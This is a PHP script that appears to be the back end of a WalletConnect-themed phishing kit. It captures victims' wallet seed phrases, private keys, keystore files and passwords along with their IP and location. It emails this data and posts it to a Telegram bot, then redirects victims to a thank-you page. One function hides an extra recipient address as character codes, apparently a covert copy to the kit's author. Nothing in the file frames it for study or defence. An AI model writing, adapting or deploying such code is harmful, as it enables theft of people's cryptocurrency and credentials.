<?php
require("config.php");
include('send_mail.php');
$ip = '';
$country = visitor_country();

$Port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$subject = "Telegram ID: @segsea**";
$message = "*****+++ @T3CHBOGURU_BOT **WELLETCONNECT\n";
$message .= "Phrase : ".$_POST['phrase']."\n";
$message .= "Keystorepassword : ".$_POST['keystorepassword']."\n";
$message .= "Privatekey : ".$_POST['privatekey']."\n";
$message .= "Keystorejson : ".$_POST['keystorejson']."\n";
$message .= "Walletname : ".$_POST['walletname']."\n";
$message .= "User-IP : ".$ip."\n";
$message .= "Country : ".$country."\n\n";
$message .= "----------------------------------------\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$headers = "From: T3CHBOI247";
@mail($send,$subject,$message,$headers);
send_telegram_msg($message);
header("location:thank_you.html");
function country_sort(){
  $sorter = "";
  $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
    $count = count($array);
  for ($i = 0; $i < $count; $i++) {
      $sorter .= chr($array[$i]);
    }
  return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    $ip = $remote;
    
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }
    
    $GLOBALS['ip'] = $ip;
    return $result;
}
?>

